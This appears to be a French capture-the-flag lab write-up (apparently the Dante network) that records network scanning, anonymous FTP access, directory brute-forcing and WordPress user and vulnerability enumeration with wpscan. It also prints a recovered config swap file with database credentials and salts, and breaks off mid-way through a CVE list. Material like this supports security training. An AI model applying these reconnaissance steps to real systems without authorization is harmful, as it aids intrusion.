```table-of-contents
title: 
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 0 # Include headings up to the specified level
include: 
exclude: 
includeLinks: true # Make headings clickable
hideWhenEmpty: false # Hide TOC if no headings are found
debugInConsole: false # Print debug info in Obsidian console
```
# Target : 10.10.110.0/24

## Enumeration du reseau

```js
nmap 10.10.110.0/24 -sn -oA tnet | grep for | cut -d" " -f5
```

- `-sn` : Désactive le scan de ports (ping scan uniquement)
- `-oA tnet` : Sauvegarde les résultats dans tous les formats

![](/assets/IMG-20260714172130175.png)

[IP Active : 10.10.110.2 , 10.10.110.100]

## Enumeration des Differents IP Trouve

L'addresse ip de la machine est le `172.16.1.100`

j'ai personnaliser un script bash pour enumerer tout les ip du reseau qui peuvent communiquer avec cette machine

```bash
#!/bin/bash

# Sous-réseau à scanner (modifie selon ton réseau)
RESEAU="172.16.1"
# Fichier de log (optionnel)
LOGFILE="ping_log.txt"

# Nettoyage du fichier log précédent
> "$LOGFILE"

echo "Début du scan de $RESEAU.0/24 ..."
echo "----------------------------------"

# Boucle sur les 254 adresses possibles
for i in {1..254}; do
    IP="$RESEAU.$i"
    
    # Ping silencieux, 1 paquet, timeout 1s
    ping -c 1 -W 1 "$IP" > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        echo "[+] Hôte actif : $IP"
        echo "$IP" >> "$LOGFILE"
    else
        echo "[-] Pas de réponse : $IP"
    fi
done

echo "----------------------------------"
echo "Scan terminé. Résultats enregistrés dans $LOGFI
```

![](/assets/IMG-20260714172130189.png)

```js
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.20
172.16.1.100
172.16.1.101
172.16.1.102
```

# 10.10.110.2

```js
nmap -sV -sC 10.10.110.2
```

* -sV : Pour enumerer les versions des services active
* -sC : pour l'utilisation des cripts par defaut

![](/assets/IMG-20260714172130227.png)

Rien d'interessant
# 10.10.110.100

```js
nmap -sV -sC -T4 10.10.110.100 -Pn
```

* -sV : Pour enumerer les versions des services active
* -sC : pour l'utilisation des cripts par defaut
* -T4 : pour un scan rapide
* -Pn : pour eviter de faire une requete ICMP

![](/assets/IMG-20260714172130269.png)

## Services et ports ouvertes sur la machine 

*  FTP : 21
*  SSH : 22
* HTTP : 65000

## FTP Enumeration

```js
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
```
cela nous montre clairement une autentification anonyme possible

![](/assets/IMG-20260714172130308.png)

![](/assets/IMG-20260714172130357.png)

Recuperation d'un ficher mais vide
## HTTP Enumeration

```js
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-title: Apache2 Ubuntu Default Page: It works
```
Avec cela nous pouvons savoir que ce dernier tourne sur Wordpress

### [Flag1 : DANTE{Y0u_Cant_G3t_at_m3_br0!}]

![](/assets/IMG-20260714172130396.png)

### Enumeration des repertoires

```js
feroxbuster -u "http://10.10.110.100:65000/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404 -x .txt,.html,.bak,.env,.php,.xmlc
```

![](/assets/IMG-20260714172130437.png)

Cette enumeration nous confirme un truc la presence d'un repertoire `/wordpress` que nous avions trouver plus haut grace au scan NMAP

![](/assets/IMG-20260714172130501.png)

![](/assets/IMG-20260714172130547.png)


![](/assets/IMG-20260714172130603.png)

Et effectivement ce dernier tourne sur wordpress

## Wordpress Enumeration

### Premiere analyse avec wpscan

```js
wpscan http://10.10.110.100:65000/wordpress
```

```js
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
[+] Started: Thu Jul  9 23:33:28 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:57 <=============================================================> (137 / 137) 100.00% Time: 00:00:57

[i] Config Backup(s) Identified:

[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
 | Found By: Direct Access (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jul  9 23:35:47 2026
[+] Requests Done: 173
[+] Cached Requests: 6
[+] Data Sent: 49.949 KB
[+] Data Received: 415.226 KB
[+] Memory used: 272.523 MB
[+] Elapsed time: 00:02:18
```

Nous avons aussi trouver un ficher `wp-config.php.swp`

```js
    ~/Téléchargements/DANTE ❯ strings wp-config.php.swp                   

b0VIM 8.1
root
DANTE-WEB-NIX01
/var/www/html/wordpress/wp-config.php
utf-8
U3210
#"! 
require_once ABSPATH . 'wp-settings.php';
/** Sets up WordPress vars and included files. */
	define( 'ABSPATH', __DIR__ . '/' );
if ( ! defined( 'ABSPATH' ) ) {
/** Absolute path to the WordPress directory. */
/* That's all, stop editing! Happy publishing. */
define( 'WP_DEBUG_LOG', true );
define( 'WP_DEBUG', true );
define( 'WP_AUTO_UPDATE_CORE', false );
define( 'AUTOMATIC_UPDATER_DISABLED', true );
define( 'WP_HTTP_BLOCK_EXTERNAL', true );
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 * visit the documentation.
 * For information on other constants that can be used for debugging,
 * in their development environments.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * Change this to true to enable the display of notices during development.
 * For developers: WordPress debugging mode.
$table_prefix = 'wp_';
 * a unique prefix. Only numbers, letters, and underscores please!
 * You can have multiple installations in one database if you give each
 * WordPress Database Table prefix.
/**#@-*/
define( 'NONCE_SALT',       'UAKOs%vl!RU S:reIECN^=uvXgV9PJSv(L4W+W.Q8]fR):P4Kk(@ML2}crn?W)TB' );
define( 'LOGGED_IN_SALT',   'c.T.hZjD5E9$><n?9/uav|G_9<U`^7n_cF0s1w[[|@Q:etFp}7^=Qgl~H?I{|a,A' );
define( 'SECURE_AUTH_SALT', '{Xrv,GS#>7B({PjsgfyL} 7ct1roDs5~keDYg2ae}M6,e|+D#fVC(gA%O]{Pz[Y]' );
define( 'AUTH_SALT',        '<=y@F ]NRpB4b#aox6W<K)#W`Jv~6n<5!^@4Y[e` js<j-}$OcQl%1ynsgJCH?&Z' );
define( 'NONCE_KEY',        'v%/@I3c8yIm2q/_jtCa~if*?E&mGe?CKE1.]|TOki8=acoL5]^xq<x5AU2V*QNK&' );
define( 'LOGGED_IN_KEY',    '*u#~mm(H.9I1%knh{`7.]OlsF3zItg$i;RVd9oG3J&i+#WrvdS<S>nSBX{S)G4y`' );
define( 'SECURE_AUTH_KEY',  'vRZ$$_BulH8-Pp%E%r0|r8Lf|2NCj~-po#AII#^IRKy]/gzjNb8bAH;Drr|-Mt0-' );
define( 'AUTH_KEY',         '`i4M-OPF-&:y_o`cJ.v!|=W:a_Haij>II.mI+JOJmgG,e|T:~]=#X $y53~>r=zp' );
 * @since 2.6.0
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * Change these to different unique phrases!
 * Authentication Unique Keys and Salts.
/**#@+
define( 'DB_COLLATE', '' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_CHARSET', 'utf8mb4' );
/** Database Charset to use in creating database tables. */
define( 'DB_HOST', 'localhost' );
/** MySQL hostname */
define( 'DB_PASSWORD', 'password' );
/** MySQL database password */
define( 'DB_USER', 'shaun' );
/** MySQL database username */
define( 'DB_NAME', 'wordpress' );
/** The name of the database for WordPress */
// ** MySQL settings - You can get this info from your web host ** //
 * @package WordPress
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 * * ABSPATH
 * * Database table prefix
 * * Secret keys
 * * MySQL settings
 * This file contains the following configurations:
 * copy this file to "wp-config.php" and fill in the values.
 * installation. You don't have to use the web site, you can
 * The wp-config.php creation script uses this file during the
 * The base configuration for WordPress
<?php
<!-- Good Job at Finding the VIM SWAP File! -->
```

#### Trouvaille dans le ficher swap

```js
DB_USER: shaun
DB_PASSWORD: password
Hostname interne: DANTE-WEB-NIX01
```
Mais ses creds sont invalides pour se connecter a la page admin du wordpress

### Enumeration des Users

```js
curl -s http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users | jq
```

![](/assets/IMG-20260714172130637.png)


![](/assets/IMG-20260714172130669.png)

```js
wpscan -e p --url http://10.10.110.100:65000/wordpress --disable-tls-checks --no-banner --enumerate u passive -t 100
```

![](/assets/IMG-20260714172130713.png)
### User trouver dans
```js
http://10.10.110.100:65000/wordpress/index.php/meet-the-team/
```
#### User Trouver
```js
admin
shaun
james
kevin
balthazar
aj
nathan
```

### Enumeration des plugins

```js
wpscan -e p --url http://10.10.110.100:65000/wordpress --disable-tls-checks --no-banner --plugins-detection passive -t 100
```


```js
[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
[+] Started: Fri Jul 10 00:26:22 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |
 | [!] 50 vulnerabilities identified:
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/831e4a94-239c-4061-b66e-f5ca0dbb84fa
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4046
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rpwf-hrh2-39jf
 |      - https://pentest.co.uk/labs/research/subtle-stored-xss-wordpress-core/
 |      - https://www.youtube.com/watch?v=tCh7Y8z8fb4
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/d8addb42-e70b-4439-b828-fd0697e5d9d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
 |      - https://www.exploit-db.com/exploits/48770/
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
 |      - https://hackerone.com/reports/406289
 |
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/b6f69ff1-4c11-48d2-b512-c65168988c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
 |
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 5.4.5
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 5.4.6
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5
 |
 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v
 |
 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update
 |     Fixed in: 5.4.7
 |     References:
 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199
 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/
 |      - https://github.com/lodash/lodash/wiki/Changelog
 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689
 |
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 |     Fixed in: 5.4.8
 |     References:
 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/54207
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
 |
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
 |      - https://hackerone.com/reports/1378209
 |
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
 |      - https://hackerone.com/reports/425342
 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
 |
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
 |
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 |     Fixed in: 5.4.9
 |     References:
 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
 |      - https://hackerone.com/reports/541469
 |
 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
 |     Fixed in: 5.4.10
 |     References:
 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09
 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.2 - SQLi via Link API
 |     Fixed in: 5.4.11
 |     References:
 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f
 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283
 |
 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095
 |
 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44
 |
 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc
 |
 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955
 |
 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8
 |
 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f
 |
 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492
 |
 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e
 |
 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg
 |     Fixed in: 5.4.12
 |     References:
 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9
 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/
 |      - https://github.com/WordPress/gutenberg/pull/45045/files
 |
 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding
 |     References:
 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590
 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/
 |
 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files
 |     Fixed in: 5.4.13
 |     References:
 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745
 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/
 |
 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF
